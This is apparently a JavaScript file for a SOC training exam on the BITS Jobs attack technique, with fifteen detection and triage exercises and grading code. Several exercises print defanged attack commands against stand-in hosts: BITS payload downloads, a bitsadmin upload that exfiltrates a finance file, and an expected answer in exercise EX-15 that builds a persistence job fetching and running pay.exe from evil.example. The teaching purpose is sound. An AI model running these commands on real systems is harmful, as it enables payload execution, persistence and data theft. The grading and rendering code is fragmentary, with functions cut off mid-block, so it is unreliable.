var META={"topicId":"t1197","mitreId":"T1197","name":"BITS Jobs","mitreName":"BITS Jobs","objectType":"technique","title":"T1197 BITS Jobs — MEDIUM","difficulty":"medium","severity":"medium","severityLabel":"MEDIUM","batch":2,"questionCount":15,"estimatedMinutes":20,"passMark":70,"protocol":"cpa-staged-v1"};
var INTRO={"learnHtml":"<p><b>Exam scope:</b> this exam teaches <b>T1197 — BITS Jobs</b>, a <b>technique</b> of the MITRE ATT&amp;CK framework. <p><b>Welcome back to the BITS desk.<\/b> You already know what BITS is and how attackers abuse it. This MEDIUM exam goes one level deeper. You will meet the <b>PowerShell road<\/b> (Start-BitsTransfer) and compare it with the classic bitsadmin tool. You will learn how the <b>BITS-Client operational event log<\/b> records every step of a job, how attackers <b>upload<\/b> data out of a network with BITS, and how the notify-command switch turns a finished job into a persistence machine. You will also map the three big mitigations (M1037, M1028, M1018) to real controls.<\/p><p>Every exercise gives you two connected ideas: first identify what you are looking at, then decide what it means. Read each scenario like a SOC ticket — the artefacts are short on purpose.<\/p>","themes":[{"name":"BITS fundamentals","concepts":["BITSAdmin tool","PowerShell BITS cmdlets","BITS job"]},{"name":"Attacker behaviours with BITS","concepts":["SetNotifyCmdLine persistence mechanics","upload-based exfiltration","complete-switch indicator removal","BITS tradecraft advantage","90-day persistence"]},{"name":"Spotting abuse in telemetry","concepts":["BITS-Client operational events","process creation logs","suspicious transfer"]},{"name":"Known threat actors","concepts":["APT39 BITS exfiltration"]},{"name":"Mitigation and response","concepts":["M1037 Filter Network Traffic","M1028 Operating System Configuration","M1018 User Account Management"]}]};
var EXERCISES=[{"id":"EX-01","type":"qcm-single","summary":"A script uses Start-BitsTransfer — identify the mechanism","concepts":["PowerShell BITS cmdlets"],"scenario":"<p>Triage queue, ticket SOC-88412, host WORKST5-23. The EDR shows a script block that ran this morning:<\/p><pre class=\"art mono\">powershell.exe -Command \"Start-BitsTransfer -Source hxxp[:]//files[.]cdn-helper[.]example/agent[.]ps1 -Destination C:\\Temp\\agent[.]ps1\"<\/pre><p>A senior analyst glances over: \"That is not certutil and it is not bitsadmin. Before we decide anything, tell me what mechanism this actually is.\"<\/p>","question":"<p>What mechanism is the script block using to move the file?<\/p>","options":["A .NET class that copies files over SMB shares","A PowerShell cmdlet that creates and starts a BITS transfer job","A built-in alias for the certutil download tool","A cmdlet that mounts a virtual hard disk image"],"correct":1,"hint":"Read the cmdlet's name slowly — it names the exact Windows service it drives.","explanation":"<p><b>Start-BitsTransfer<\/b> is the main PowerShell cmdlet for BITS: it creates and starts a BITS transfer job, exactly as bitsadmin does from the command line. Both roads drive the same underlying service. It is not an SMB file copy, not an alias for certutil, and it has nothing to do with disk images.<\/p>","study":"PowerShell BITS cmdlets: Start-BitsTransfer and Get-BitsTransfer, and how they map to bitsadmin actions."},{"id":"EX-02","type":"qcm-single","summary":"Why an attacker swaps certutil for BITS jobs","concepts":["BITS tradecraft advantage"],"scenario":"<p>Threat-intel debrief. On the compromised host the intruder already had a working download habit, yet the malware still creates a BITS job for its second stage. Your junior asks why the attacker would bother switching tools.<\/p><p>You open the notes: the job's traffic rides the trusted BITS service, host firewalls commonly allow it, and the job's state stays inside the BITS job database instead of new files or registry keys.<\/p>","question":"<p>What is the main operational reason the attacker prefers the BITS job here?<\/p>","options":["BITS downloads are faster than any other Windows tool","BITS traffic blends in: the trusted service is commonly firewall-allowed and the job leaves no new files or registry keys","BITS jobs are invisible to every endpoint product by design","BITS works without any user account or logon session"],"correct":1,"hint":"Two ideas decide this: what the network side allows, and what the disk looks like afterwards.","explanation":"<p>The tradecraft advantage is stealth and allowance: BITS is a trusted Windows service whose traffic host firewalls commonly permit, and the job lives in the BITS job database without dropping new files or registry modifications. It is not about raw speed, endpoint tools do log BITS activity, and a job still belongs to an owning user whose logon gates its transfers.<\/p>","study":"ATT&CK T1197 description: why BITS beats a plain download for a quiet intruder."},{"id":"EX-03","type":"fill-blank","summary":"When does a BITS notify command actually fire?","concepts":["SetNotifyCmdLine persistence mechanics"],"scenario":"<p>You are drafting the team note for T1197 hunting. The sentence must be exact, because a detection rule depends on it: the /setnotifycmdline switch attaches a command that BITS runs by itself — the attacker does not come back to click anything.<\/p>","question":"<p>Fill both blanks with the two trigger conditions.<\/p>","template":"Finish the note: bitsadmin /setnotifycmdline attaches a command that BITS runs when the job <input1> or <input2> — either way, the attacker's code runs.","blanks":[{"answer":"completes","alts":["complete","finished","finishes"],"placeholder":"verb","width":10},{"answer":"errors","alts":["error","fails","failed"],"placeholder":"verb","width":8}],"hint":"First blank: the download succeeded. Second blank: the download did not.","explanation":"<p>The notify command fires on <b>completion<\/b> or on <b>error<\/b>. That is the trick: even a failed or cancelled download can still launch the attacker's command, so the execution does not depend on a perfect transfer.<\/p>","study":"bitsadmin reference: /setnotifycmdline and the job states that trigger the notify command."},{"id":"EX-04","type":"qcm-single","summary":"Payload re-runs after a reboot with no new files","concepts":["SetNotifyCmdLine persistence mechanics","90-day persistence"],"scenario":"<p>Incident SOC-88530, host SRV-APP02. The server was rebooted for patching twelve days ago. Since then no new binary has been written to disk.<\/p><p>This morning the Bits-Client log shows the old job 'DrvCfg' completing again, and EDR records a child cmd.exe under svchost.exe -k netsvcs -s BITS — the same signature as the original alert from weeks ago. A teammate shrugs: \"Nothing landed on disk, so what re-ran the code?\"<\/p>","question":"<p>Why did the payload's command run again without any new file being written?<\/p>","options":["The reboot restored an old restore point containing the malware","Windows Update silently reinstalled the payload overnight","The long-lived job survived in the BITS job database, and its notify command ran again when the job completed","The BITS service rebuilt the job from a cached installer package"],"correct":2,"hint":"The job never vanished in the reboot — think about where job state lives and what the job is instructed to do when it finishes.","explanation":"<p>BITS jobs are persistent: the job (and its notify command) lives in the BITS job database and can stay alive for months — the default maximum lifetime is 90 days and it can be extended. When the long-lived job completed again, BITS ran its notify command from the BITS svchost. No new file was needed. Restore points, Windows Update, and cached installers are not part of this mechanism.<\/p>","study":"ATT&CK T1197: long-standing BITS jobs as persistence, default 90-day lifetime."},{"id":"EX-05","type":"drag-drop","summary":"Map six controls to M1037, M1028 and M1018","concepts":["M1037 Filter Network Traffic","M1028 Operating System Configuration","M1018 User Account Management"],"scenario":"<p>Your mitigation plan for T1197 lists six controls, but the reviewer wants each one filed under the correct ATT&amp;CK mitigation. Place each control under the mitigation it belongs to.<\/p>","question":"<p>Place each control under the right mitigation ID.<\/p>","bank":["Block BITS traffic to unapproved external hosts at the perimeter","Disable the BITS service on servers that never need it","Use Group Policy to cap job size and lifetime on clients","Remove local administrator rights so users cannot create arbitrary jobs","Restrict which URL ranges BITS may reach with web filtering rules","Require elevated accounts for BITS administration through policy"],"slots":[{"label":"M1037 Filter Network Traffic","accept":[0,4]},{"label":"M1028 Operating System Configuration","accept":[1,2]},{"label":"M1018 User Account Management","accept":[3,5]}],"hint":"Network filtering shapes traffic; OS configuration changes the service itself; account management changes who can act.","explanation":"<p>M1037 covers traffic shaping: the perimeter block and the web-filter URL ranges. M1028 covers the service and its configuration: disabling BITS where unneeded, and Group Policy caps on job size and lifetime. M1018 covers people and privileges: removing local admin rights and requiring elevated accounts for job administration.<\/p>","study":"ATT&CK T1197 mitigation table: M1037, M1028, M1018."},{"id":"EX-06","type":"qcm-multi","summary":"Two truths about BITS upload exfiltration","concepts":["upload-based exfiltration","APT39 BITS exfiltration"],"scenario":"<p>Case SOC-88601. The proxy log shows a BITS job pushing data outward from a finance workstation. The threat-intel card on your desk reads: \"APT39 (G0087) has used the BITS protocol to exfiltrate stolen data.\"<\/p><pre class=\"art mono\">bitsadmin /transfer sync1 /upload /destination hxxp[:]//drop[.]sync-vault[.]example/up C:\\EOY\\pack[.]xlsx<\/pre>","question":"<p>Select the <b>two<\/b> statements that are true about this use of BITS.<\/p>","options":["The /upload switch makes BITS send a local file out to the remote destination","An upload job matches exfiltration over an alternative protocol, not a tool-transfer download","The /upload switch downloads a file from the destination onto the host","BITS can only move data from the internet onto the host, never outward"],"correct":[0,1],"hint":"Follow the direction of travel, then match the tactic that describes data leaving the network.","explanation":"<p>With /upload, BITS is the sender: a local file goes out to the remote destination, which is why ATT&amp;CK maps this to exfiltration over an alternative protocol — exactly how APT39 used the BITS protocol — and not to the tool-transfer download case. The other two statements reverse the direction of travel.<\/p>","study":"ATT&CK T1197 procedure examples: APT39 (G0087); T1048 for the exfiltration mapping."},{"id":"EX-07","type":"line-select","summary":"Bits-Client log: mark the abused job's lines","concepts":["BITS-Client operational events","suspicious transfer"],"scenario":"<p>Here is an excerpt from the Microsoft-Windows-Bits-Client/Operational log on WORKST7-04. One job belongs to routine vendor patching; the other was retried after an error and ended by launching a command.<\/p>","question":"<p>Click every line that belongs to the suspicious job's abuse pattern — the job from the unknown domain and the event that runs its command. Do not click the routine vendor job.<\/p>","logLines":["11:02:14  EID 59  job created:  name=WinZip-Upd  owner=NWTRADER\\j.moreau  url=hxxp[:]//cdn[.]winzip[.]example/eval[.]msi","11:02:20  EID 3   transfer complete:  job=WinZip-Upd  bytes=4,120,576","13:47:03  EID 59  job created:  name=SysTool  owner=NWTRADER\\j.moreau  url=hxxp[:]//files[.]upd-helper[.]example/svc[.]exe","13:47:44  EID 4   transfer error:  job=SysTool  code=0x80190194","13:47:59  EID 59  job created:  name=SysTool  owner=NWTRADER\\j.moreau  url=hxxp[:]//files[.]upd-helper[.]example/svc[.]exe","13:48:30  EID 3   transfer complete:  job=SysTool  bytes=88,320","13:48:31  EID 25  notify command:  job=SysTool  cmd=C:\\Temp\\svc[.]exe"],"badLines":[2,4,6],"hint":"One job is a routine installer from a known vendor domain. The other was retried after an error and finished with an event that executes a command.","explanation":"<p>The SysTool job is the abused one: it pulls svc[.]exe from a domain that is not the vendor's, is retried after a 404-style error (EID 4), completes, and then EID 25 shows BITS launching its notify command C:\\Temp\\svc[.]exe. The WinZip-Upd job matches routine vendor patching, so its two lines stay unclicked.<\/p>","study":"Microsoft-Windows-Bits-Client/Operational: event 59 job created, 3/4 complete/error, 25 notify command."},{"id":"EX-08","type":"fill-blank","summary":"Which event IDs mark job creation and notify?","concepts":["BITS-Client operational events"],"scenario":"<p>You are writing the T1197 hunting rule with a detection engineer. She needs the two anchor event IDs from the Bits-Client operational log: one for job creation, one for the notify command. The transfer events (3 and 4) are already covered by another rule.<\/p>","question":"<p>Fill both event IDs.<\/p>","template":"For the hunting rule: in the Microsoft-Windows-Bits-Client/Operational log, Event ID <input1> records that a new BITS job was created, and Event ID <input2> records that the job's notify command ran.","blanks":[{"answer":"59","alts":["eid 59","event 59","event id 59"],"placeholder":"event ID","width":5},{"answer":"25","alts":["eid 25","event 25","event id 25"],"placeholder":"event ID","width":5}],"hint":"The job-creation ID is in the fifties; the notify-command ID is in the twenties.","explanation":"<p>Event ID <b>59<\/b> records job creation and Event ID <b>25<\/b> records the notify command in the Microsoft-Windows-Bits-Client/Operational log (transfers are 3 and 4). These two anchors, joined with process telemetry, make the T1197 rule.<\/p>","study":"Microsoft-Windows-Bits-Client/Operational event IDs: 59, 3, 4, 25."}];

EXERCISES.push({"id":"EX-09","type":"matching","summary":"Match BITS tools and switches to attacker effects","concepts":["PowerShell BITS cmdlets","SetNotifyCmdLine persistence mechanics","upload-based exfiltration","complete-switch indicator removal"],"scenario":"<p>New-analyst mentoring hour. You deal four cards from the T1197 toolbox and ask the group to pair each tool or switch with what it hands an attacker.<\/p>","question":"<p>Click an item on the left, then its match on the right.<\/p>","pairs":[{"left":"Start-BitsTransfer","right":"the PowerShell road to the same BITS service"},{"left":"bitsadmin /setnotifycmdline","right":"attaches the command that runs when the job ends"},{"left":"bitsadmin /transfer /upload","right":"one-shot send of a local file to a remote host"},{"left":"bitsadmin /complete","right":"clears the finished job and its database entry"}],"hint":"Match the effect, not the spelling: one cmdlet, one completion trigger, one outbound send, one cleanup.","explanation":"<p>Start-BitsTransfer is the PowerShell road to the same BITS service; /setnotifycmdline attaches the completion command; /transfer /upload sends a local file outward; /complete finalises the job and clears it from the queue and job database — the cleanup an attacker runs to remove traces.<\/p>","study":"bitsadmin switch reference plus the PowerShell BITS cmdlet family."},
{"id":"EX-10","type":"fill-blank","summary":"Job vanished from /list — what cleaned it up?","concepts":["complete-switch indicator removal"],"scenario":"<p>You respond to case SOC-88601 three days after the first alert. The malicious job 'SysTool' is gone: it is not in bitsadmin /list, and its entry is missing from the BITS job database.<\/p><p>Yet the Bits-Client operational log still shows the job's full lifecycle from Monday — creation, transfer, notify command. Nothing on the host rebooted in between.<\/p>","question":"<p>Fill the blanks: the job was tidied away by bitsadmin <input1>, which is a form of indicator <input2> — but the Bits-Client operational log still holds the evidence.<\/p>","options":["A reboot purged it — the operational log is worthless now","The attacker ran bitsadmin /complete, clearing the job while the operational log still holds the evidence","BITS wipes every event out of the operational log after 24 hours","Antivirus quarantined the BITS job database"],"correct":1,"hint":"The switch that finalises a finished job starts with a slash; the ATT&CK word for tidying evidence away is \"indicator ____\".","explanation":"<p>bitsadmin /complete finalises a job and removes it from the queue and the job database — a classic indicator-removal cleanup. It does not rewrite history: the Bits-Client operational log still records the job's lifecycle, which is exactly what you quote in the report. No reboot happened, the operational log is not wiped after 24 hours, and antivirus does not remove jobs this way.<\/p>","study":"bitsadmin /complete behaviour; T1070 indicator-removal thinking.","template":"Fill the blanks: the job was tidied away by bitsadmin <input1>, which is a form of indicator <input2> — but the Bits-Client operational log still holds the evidence.","blanks":[{"answer":"/complete","alts":["complete","/complete"],"placeholder":"switch","width":11},{"answer":"removal","alts":["removal."],"placeholder":"noun","width":9}]},
{"id":"EX-11","type":"ordering","summary":"Order the full BITS job lifecycle","concepts":["BITS-Client operational events","BITS job","complete-switch indicator removal"],"scenario":"<p>For the wiki page 'Life and death of a BITS job', order the five milestones the way the telemetry records them.<\/p>","question":"<p>Order the milestones from first to last.<\/p>","items":["bitsadmin /create and /addfile run in a shell","Event 59 — the job appears in the Bits-Client log","Event 3 or 4 — the transfer completes or errors","Event 25 — BITS launches the notify command","bitsadmin /complete — the job and its evidence are cleared"],"hint":"Creation comes before any event ID; cleanup comes after everything else.","explanation":"<p>The shell creates the job and queues the file (event 59 logs the creation), BITS transfers the file and logs event 3 or 4, the notify command fires as event 25, and finally /complete clears the job from the queue and job database.<\/p>","study":"The Bits-Client event sequence: 59 → 3/4 → 25 → (cleanup)."},
{"id":"EX-12","type":"multi-step","summary":"Three-step triage of a BITS upload job","concepts":["upload-based exfiltration"],"scenario":"<p>Escalation SOC-88699. Work through the three decision points in order.<\/p>","question":"<p>Choose the best action at each of the three steps.<\/p>","steps":[{"prompt":"Bits-Client event 59 shows job 'SyncUp' on FIN-WKS03 with an upload URL to hxxp[:]//drop[.]sync-vault[.]example. What is your first move?","options":["Delete the job immediately so nothing else leaves","Pull the job details: local source file, remote destination, and owning user","Email the whole company about a data leak"],"correct":1,"outcome":"Right — before any action you need the what, the where, and the who from the job itself."},{"prompt":"Job details: source C:\\EOY\\budget[.]xlsx, owner=svc_report, destination the external host above. Which question decides your next step?","options":["Which data has already left, and is the destination internal or external?","Whether the print spooler on FIN-WKS03 is healthy","Whether BITS is enabled on the host"],"correct":0,"outcome":"Correct — scope of loss and destination attribution drive everything that follows."},{"prompt":"The destination is external and the source is the month-end finance pack. Now what?","options":["Treat it as a confirmed exfiltration attempt: block the domain, preserve the job evidence, escalate to IR","Wait for the owning team to complain about a missing file","Reboot FIN-WKS03 to interrupt the transfer"],"correct":0,"outcome":"Yes — confirmed outbound data means containment, preservation, and escalation in that order."}],"hint":"Identify first, scope second, act third — never the reverse.","explanation":"<p>The upload job is identified from event 59, scoped from the job details (source file, destination, owner), and only then contained: block, preserve, escalate. Deleting or rebooting first destroys both evidence and your ability to scope the loss.<\/p>","study":"Exfiltration triage order: identify → scope → contain → escalate."},
{"id":"EX-13","type":"qcm-multi","summary":"Two truths about the PowerShell BITS road","concepts":["PowerShell BITS cmdlets"],"scenario":"<p>A junior insists: \"PowerShell BITS cmdlets must be some separate hidden system — no log would ever see those jobs.\" You have ten minutes to correct him with two true statements.<\/p>","question":"<p>Select the <b>two<\/b> true statements.<\/p>","options":["PowerShell BITS cmdlets and bitsadmin drive the same underlying BITS service","A job created by Start-BitsTransfer appears in the same job store and telemetry as any other BITS job","PowerShell cmdlets create a special job type that no log records","A job made by Start-BitsTransfer can never be seen by bitsadmin /list"],"correct":[0,1],"hint":"There is one BITS service underneath both roads — and one job database.","explanation":"<p>Both tools drive the same BITS service through the same interfaces, so a Start-BitsTransfer job lands in the same job store and shows up to bitsadmin /list and in the same event logs. There is no invisible special job type.<\/p>","study":"Start-BitsTransfer vs bitsadmin: one service, two interfaces."},
{"id":"EX-14","type":"line-select","summary":"Spot the Start-BitsTransfer payload pull","concepts":["PowerShell BITS cmdlets","process creation logs"],"scenario":"<p>Sysmon-style process-creation lines from WORKST2-17, one afternoon. Several downloads happen — but only one of them rides BITS from PowerShell.<\/p>","question":"<p>Click the <b>one<\/b> line where BITS is driven from PowerShell to pull a file.<\/p>","logLines":["EvtID=1  Image=certutil.exe   Cmd=-urlcache -split -f hxxp[:]//old[.]cdn[.]example/pack[.]cab","EvtID=1  Image=powershell.exe Cmd=Start-BitsTransfer -Source hxxp[:]//files[.]upd-helper[.]example/svc[.]exe -Destination C:\\Temp\\svc[.]exe","EvtID=1  Image=svchost.exe -k netsvcs -p -s wuauserv  (Windows Update)","EvtID=1  Image=msiexec.exe    Cmd=/i \\\\fileshare\\pkgs\\office-patch[.]msi /qn","EvtID=1  Image=curl.exe       Cmd=-o C:\\Temp\\notes[.]txt hxxp[:]//intranet[.]nwtraders[.]example/notes[.]txt"],"badLines":[1],"hint":"The line you want names the BITS cmdlet — look for Start-BitsTransfer with a -Source URL.","explanation":"<p>The powershell.exe line calls Start-BitsTransfer with an external source URL and a Temp destination — a BITS download driven from PowerShell, the same service bitsadmin would use. certutil and curl are downloads too, but they are not BITS; msiexec installs from an internal share and the svchost line is the normal update service.<\/p>","study":"Process telemetry: PowerShell command lines with Start-BitsTransfer and external -Source URLs."},
{"id":"EX-15","type":"terminal","summary":"Compose the setnotifycmdline persistence job","concepts":["BITSAdmin tool","SetNotifyCmdLine persistence mechanics"],"scenario":"<p>Detection-validation lab, host LAB-HUNT01, elevated PowerShell. Build the classic T1197 persistence job with bitsadmin.exe: job name <span class=\"mono\">taskh<\/span>; download <span class=\"mono\">pay[.]exe<\/span> from hxxp[:]//evil[.]example/pay[.]exe into C:\\Temp\\pay[.]exe; make BITS run that downloaded file when the job finishes; then start the job. Type the whole thing as one command line.<\/p>","question":"<p>Type the command that builds and starts this persistence job.<\/p>","shellPrompt":"PS C:\\&gt;","expected":"bitsadmin /create taskh /addfile taskh hxxp[:]//evil[.]example/pay[.]exe C:\\Temp\\pay[.]exe /setnotifycmdline taskh C:\\Temp\\pay[.]exe /resume taskh","elements":[{"any":["/addfile"],"label":"the /addfile switch"},{"any":["/setnotifycmdline"],"label":"the /setnotifycmdline switch"}],"hint":"Two switches are graded: the one that queues the file from the URL, and the one that attaches the completion command.","explanation":"<p>The line creates job taskh, /addfile queues the download from the URL to C:\\Temp\\pay[.]exe, /setnotifycmdline attaches the downloaded file as the command BITS runs on completion, and /resume starts the job. Graded elements: /addfile and /setnotifycmdline — the download and the execution trigger.<\/p>","study":"bitsadmin one-liners: /create + /addfile + /setnotifycmdline + /resume."});

      N = 1;
      var sel = wstate.sel && wstate.sel[0];
      if (sel === undefined) { item('mi', 'No option selected'); }
      else if (sel === ex.correct) { H = 1; item('ok', '✓ Correct — ' + strip(ex.options[ex.correct])); }
      else { W = 1; item('no', '✗ You chose: ' + strip(ex.options[sel])); }
      canon = ex.options[ex.correct];
    } else if (ex.type === 'qcm-multi') {
      N = ex.correct.length;
      var selset = wstate.sel || [];
      ex.correct.forEach(function (ci) {
        if (selset.indexOf(ci) >= 0) { H++; item('ok', '✓ Correct: ' + strip(ex.options[ci])); }
        else { item('mi', '○ Missed: ' + strip(ex.options[ci])); }
      });
      selset.forEach(function (si) { if (ex.correct.indexOf(si) < 0) { W++; item('no', '✗ Wrong: ' + strip(ex.options[si])); } });
      canon = ex.correct.map(function (ci) { return strip(ex.options[ci]); }).join(' · ');
    } else if (ex.type === 'fill-blank') {
      N = ex.blanks.length;
      ex.blanks.forEach(function (bl, bi) {
        var v = norm(wstate.vals && wstate.vals[bi]);
        var accept = [norm(bl.answer)].concat((bl.alts || []).map(norm));
        if (!v) { item('mi', '○ Missed blank ' + (bi + 1) + ' — expected: ' + esc(bl.answer)); }
        else if (accept.indexOf(v) >= 0) { H++; item('ok', '✓ Blank ' + (bi + 1) + ': ' + esc(bl.answer)); }
        else { W++; item('no', '✗ Blank ' + (bi + 1) + ' — you typed "' + esc(v) + '", expected: ' + esc(bl.answer)); }
      });
      canon = ex.blanks.map(function (bl) { return bl.answer; }).join(' | ');
    } else if (ex.type === 'drag-drop') {
      N = ex.bank.length;
      Object.keys(wstate.place || {}).forEach(function (k) {
        var bi = parseInt(k, 10), si = wstate.place[k];
        if (ex.slots[si] && ex.slots[si].accept.indexOf(bi) >= 0) { H++; item('ok', '✓ "' + strip(ex.bank[bi]) + '" → ' + esc(ex.slots[si].label)); }
        else { W++; item('no', '✗ "' + strip(ex.bank[bi]) + '" does not belong in ' + esc(ex.slots[si] ? ex.slots[si].label : '?')); }
      });
      ex.bank.forEach(function (t, bi) { if (wstate.place[bi] === undefined) item('mi', '○ Missed: "' + strip(t) + '" → ' + esc(slotLabelFor(ex, bi))); });
      canon = ex.slots.map(function (sl) { return sl.label + ': ' + sl.accept.map(function (bi) { return strip(ex.bank[bi]); }).join(', '); }).join(' | ');
    } else if (ex.type === 'ordering') {
      N = ex.items.length;
      var order = wstate.order || [];
      order.forEach(function (bi, pos) {
        if (bi === pos) { H++; item('ok', '✓ Position ' + (pos + 1) + ': ' + strip(ex.items[pos])); }
        else { W++; item('no', '✗ Position ' + (pos + 1) + ' — you put "' + strip(ex.items[bi]) + '", expected "' + strip(ex.items[pos]) + '"'); }
      });
      canon = ex.items.map(function (t, i) { return (i + 1) + '. ' + strip(t); }).join(' ');
    } else if (ex.type === 'matching') {
      N = ex.pairs.length;
      ex.pairs.forEach(function (p, li) {
        var a = (wstate.assign || {})[li];
        if (a === undefined) item('mi', '○ Missed: "' + strip(p.left) + '" → ' + esc(p.right));
        else if (a === li) { H++; item('ok', '✓ "' + strip(p.left) + '" → ' + esc(p.right)); }
        else { W++; item('no', '✗ "' + strip(p.left) + '" you matched to "' + strip(ex.pairs[a].right) + '", expected "' + esc(p.right) + '"'); }
      });
      canon = ex.pairs.map(function (p) { return strip(p.left) + ' = ' + strip(p.right); }).join(' | ');
    } else if (ex.type === 'terminal') {
      N = ex.elements.length;
      var cmd = norm(wstate.cmd || '');
      ex.elements.forEach(function (el2) {
        var hit = (el2.any || []).some(function (a) { return cmd.indexOf(String(a).toLowerCase()) >= 0; });
        if (hit) { H++; item('ok', '✓ ' + esc(el2.label)); }
        else { item('mi', '○ Missing: ' + esc(el2.label)); }
      });
      if (!cmd) item('mi', '○ Nothing typed — expected: ' + esc(ex.expected));
      canon = ex.expected;
    } else if (ex.type === 'line-select') {
      N = ex.badLines.length;
      var sel2 = wstate.sel || [];
      ex.badLines.forEach(function (li) {
        if (sel2.indexOf(li) >= 0) { H++; item('ok', '✓ Line ' + (li + 1) + ' is indeed the one to flag'); }
        else { item('mi', '○ Missed line ' + (li + 1) + ': ' + esc(shorten(ex.logLines[li], 90))); }
      });
      sel2.forEach(function (li) {
        if (ex.badLines.indexOf(li) < 0) { W++; item('no', '✗ Line ' + (li + 1) + ' is benign: ' + esc(shorten(ex.logLines[li], 80))); }
      });
      canon = ex.badLines.map(function (li) { return 'line ' + (li + 1); }).join(', ');
    } else if (ex.type === 'multi-step') {
      N = ex.steps.length;
      ex.steps.forEach(function (st, si) {
        var p = (wstate.picks || {})[si];
        if (p === undefined) item('mi', '○ Missed step ' + (si + 1) + ' — expected: ' + strip(st.options[st.correct]));
        else if (p === st.correct) { H++; item('ok', '✓ Step ' + (si + 1) + ': ' + strip(st.options[st.correct])); }
        else { W++; item('no', '✗ Step ' + (si + 1) + ' — you chose "' + strip(st.options[p]) + '", expected "' + strip(st.options[st.correct]) + '"'); }
      });
      canon = ex.steps.map(function (st, si) { return (si + 1) + '. ' + strip(st.options[st.correct]); }).join(' ');
    }
    var credit = N > 0 ? Math.max(0, (H - W) / N) : 0;
    if (N === 1) credit = H === 1 ? 1 : 0; /* single-answer: binary */
    if (S.answers[S.current].hintUsed) credit = Math.max(0, credit - 0.10);
    credit = Math.round(credit * 100) / 100;
    return { credit: credit, items: items, N: N, H: H, W: W, canon: canon };
  }
  function strip(s) { return esc(String(s).replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim()); }
  function shorten(s, n) { s = String(s); return s.length > n ? s.slice(0, n - 1) + '…' : s; }
  function slotLabelFor(ex, bi) { var lbl = ''; ex.slots.forEach(function (sl) { if (sl.accept.indexOf(bi) >= 0) lbl = sl.label; }); return lbl; }

  /* ---------------- exercise screen ---------------- */
  function renderExercise(i) {
    var ex = EXERCISES[i];
    S.current = i;
    var a = S.answers[i];
    var area = $('exerciseArea'); area.innerHTML = '';
    $('tbTitle').textContent = META.title;
    $('tbSevWord').textContent = META.severityLabel;
    $('progressBar').style.width = Math.round(((i + 1) / EXERCISES.length) * 100) + '%';
    var tpEl = $('tbPart'); if (tpEl) { tpEl.textContent = 'Exercise ' + (i + 1) + ' of ' + EXERCISES.length; }

    var card = el('div', 'card');
    /* SCENARIO */
    var sc = el('div', 'block blk-scenario');
    var longSc = ex.scenario.length > 380;
    sc.innerHTML = '<div class="block-h"><span aria-hidden="true">📄</span> SCENARIO' + (longSc ? '<button type="button" class="sc-toggle" aria-expanded="true">⇅ collapse</button>' : '') + '</div>' +
      '<div class="block-b" id="scBody">' + ex.scenario + (ex.artifactNote ? '<div class="dd-hint">' + esc(ex.artifactNote) + '</div>' : '') + '</div>';
    card.appendChild(sc);
    if (longSc) {
      var tbtn = sc.querySelector('.sc-toggle'), body = sc.querySelector('#scBody');
      tbtn.addEventListener('click', function () {

    card.appendChild(el('div', 'block blk-question',

    /* YOUR ANSWER */
    var answ = el('div', 'block blk-answer', '<div class="block-h"><span aria-hidden="true">✍</span> YOUR ANSWER</div>');
    var abody = el('div', 'block-b'); answ.appendChild(abody); card.appendChild(answ);

    var wstate = a.wstate;
    widgetFor(ex, abody, wstate);

    /* action row */
    var actions = el('div', 'actions');
    var checkBtn = el('button', 'btn btn-primary', '✓ Check');
    checkBtn.type = 'button'; checkBtn.id = 'checkBtn'; checkBtn.setAttribute('aria-label', 'Check your answer');
    checkBtn.addEventListener('click', doCheck);
    var nextBtn = el('button', 'btn btn-blue hidden', (i === EXERCISES.length - 1 || S.reviewMode) ? (S.reviewMode ? '⏭ Back to review' : '⏭ Final submit') : '⏭ Next');
    nextBtn.type = 'button'; nextBtn.id = 'nextBtn';
    nextBtn.addEventListener('click', goNext);
    var hintBtn = el('button', 'btn btn-amber', '💡 Hint (−10%)');
    hintBtn.type = 'button'; hintBtn.setAttribute('aria-label', 'Show hint, costs 10 percent of this exercise credit');
    hintBtn.disabled = a.hintUsed || a.status === 'checked';
    hintBtn.addEventListener('click', function () {
      if (a.hintUsed || a.status === 'checked') return;
      a.hintUsed = true; hintBtn.disabled = true;
      var hb = el('div', 'hintbox', '<div class="hb-h">💡 Hint — this exercise\'s credit is now reduced by 10%</div>' + esc(ex.hint));
      card.insertBefore(hb, actions);
    });
    var skipBtn = el('button', 'btn btn-ghost', '⚠ Skip');
    skipBtn.type = 'button'; skipBtn.setAttribute('aria-label', 'Skip this exercise'); skipBtn.disabled = a.status === 'checked';
    skipBtn.addEventListener('click', doSkip);
    actions.appendChild(checkBtn); actions.appendChild(nextBtn); actions.appendChild(el('span', 'spacer'));
    actions.appendChild(hintBtn); actions.appendChild(skipBtn);
    card.appendChild(actions);
    area.appendChild(card);

    /* manual pause veil (hidden by default) */
    if (S.timerState === 'PAUSED_MANUAL') showPauseVeil();

    /* restore feedback if already checked (should not normally happen) */
    if (a.status === 'checked') { renderFeedback(card, ex, a, true); checkBtn.disabled = true; nextBtn.classList.remove('hidden'); }

    updateScoreBar();
    /* pause button lives in topbar */

  }
  function renderTopbarButtons() {
    var bar = $('topbar');
    var old = document.getElementById('pauseBtn');
    if (old) old.remove();
    if (S.screen !== 'exam') return;
    var b = el('button', 'btn btn-ghost', '⏸ Pause');
    b.type = 'button'; b.id = 'pauseBtn'; b.setAttribute('aria-label', 'Pause the exam (manual pause)');
    b.addEventListener('click', function () {
      if (S.timerState === 'RUNNING' || S.timerState === 'PAUSED_AUTO_CHECK') {
        S.priorState = S.timerState;
        setTimerState('PAUSED_MANUAL'); showPauseVeil();
      } else if (S.timerState === 'PAUSED_MANUAL') {
        hidePauseVeil(); setTimerState(S.priorState || 'RUNNING');
      }
    });
    bar.appendChild(b);
    var oldF = document.getElementById('finishBtn');
    if (oldF) oldF.remove();
    var f = el('button', 'btn btn-ghost', '⏹ Finish');

  }
  function showPauseVeil() {

    var veil = el('div', 'pause-veil',
      '<div class="pv-ic" aria-hidden="true">⏸</div><div class="pv-word">PAUSED — manual</div>' +
      '<div style="color:var(--text-secondary);max-width:420px">The exercise is hidden while you are on a break. The timer is stopped.</div>');
    var r = el('button', 'btn btn-primary', '▶ Resume');

  function doCheck() {
    var i = S.current, ex = EXERCISES[i], a = S.answers[i];
    if (a.status === 'checked') return;
    var res = scoreExercise(ex, a.wstate);
    a.status = 'checked';
    a.credit = res.credit;
    a.result = res;
    a.label = res.credit >= 1 ? 'correct' : (res.credit > 0 ? 'partial' : 'incorrect');
    setTimerState('PAUSED_AUTO_CHECK'); /* check-triggered auto-pause */
